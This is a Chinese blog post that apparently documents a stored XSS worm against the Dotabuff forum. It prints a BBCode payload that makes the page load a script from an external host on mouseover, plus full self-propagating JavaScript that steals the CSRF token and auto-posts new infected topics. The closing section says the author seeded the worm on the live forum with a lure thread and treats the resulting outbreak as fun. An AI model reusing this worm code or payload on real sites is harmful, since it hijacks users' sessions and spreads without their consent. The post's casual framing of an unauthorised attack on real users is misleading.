---
layout: post
title: Dotabuff BBS Worm
---
#### Dotabuff/forums/general

Dotabuff 是一个 dota2 综合资讯统计网站，在上面可以看到所有开放自己比赛数据的玩家，不光是你自己，如果输入正确名字的话，所有你喜欢的职业选手在开始玩dota2以来的数据都能在上面查看到，这也是查看队友真是水平的方便工具，在 dotabuff 内就可以轻松的查看英雄的使用次数，胜率以及KDA。

Dotabuff 建立了一个庞大的社区，拥有 22,043 个主题和 317,828 个讨论。

#### Vulnerability

Dotabuff 社区采用了 [BB Code](https://zh.wikipedia.org/zh/BBCode) ，当内容为：```[url=javascript:xxx]mog[/url]``` 时，用户点击链接会触发作者编写的 js 代码，之后又发现使用 email 与 url 的配合导致截断可自定义属性，也就满足了用户进入页面后触发 js 的条件。

    [email][url]test onmouseover=t=document.createElement('script');
    t.src='//n0tr00t/_.js';document.body.appendChild(t);//
    style=display:block;position:absolute;top:0px;left:0px;
    margin-left:-1000px;margin-top:-1000px;width:99999px;
    height:99999px;//[/url][/email]

#### Exploit

    // func: dotabuff
    // author: evi1m0

    var _j = document.createElement('script');
    var _c = document.createElement('script');

    _c.src = '//t.cn/xxxxx';
    _j.src = '//lib.sinaapp.com/js/jquery/1.9.1/jquery-1.9.1.min.js';

    (document.getElementsByTagName('HEAD')[0]||document.body).appendChild(_j);
    (document.getElementsByTagName('HEAD')[0]||document.body).appendChild(_c);

    function random_num(_i){
      var str = '';
      for(var i = 0; i < _i; i += 1) {
        str += Math.floor(Math.random() * 10);
      }
      return str;
    }

    function get_topic_token(){
        var temp;
        $.ajax({
          async: false,
          type : 'GET',
          url  : '/topics/new?forum=general',
          success : function(data) {
              temp = data;
          }
        });
        _v_start = temp.split('authenticity_token')[2];
        _v_end   = _v_start.split('" />')[0].slice(9);
        return _v_end;
    }

    function new_topic(){
        topic_name = 'Var.Wonderful moment! -- ' + random_num(8);
        topic_body = "just for test :) - Click Me: [email][url]test onmouseover=t=document.createElement('script');t.src='//n0tr00t/_.js';document.body.appendChild(t);// style=display:block;position:absolute;top:0px;left:0px;margin-left:-1000px;margin-top:-1000px;width:99999px;height:99999px;//[/url][/email]"
        authenticity_token = get_topic_token();
        $.ajax({
          async: false,
          type : 'POST',
          url  : '/topics',
          data : {'utf8': '%E2%9C%93', 'authenticity_token': authenticity_token,
                  'forum': 'general', 'topic[name]': topic_name, 'topic[body]': topic_body,
                  'commit': 'Create Topic'},
          success : function(data) {
          },
        });
    }

    new_topic();

#### Spread

傍晚前我在社区发表了一篇名为《 Dendi's Pudge [ 24/0/15 ] 》的诱导帖，不一会儿的功夫论坛就炸锅了：

![http://ww1.sinaimg.cn/large/c334041bgw1ew9wyxvvj6j21400se49q.jpg](http://ww1.sinaimg.cn/large/c334041bgw1ew9wyxvvj6j21400se49q.jpg)

总之是蛮有趣的 ฅ'ω'ฅ

![http://ww1.sinaimg.cn/large/c334041bgw1ew9wznivbej20m808gt96.jpg](http://ww1.sinaimg.cn/large/c334041bgw1ew9wznivbej20m808gt96.jpg)
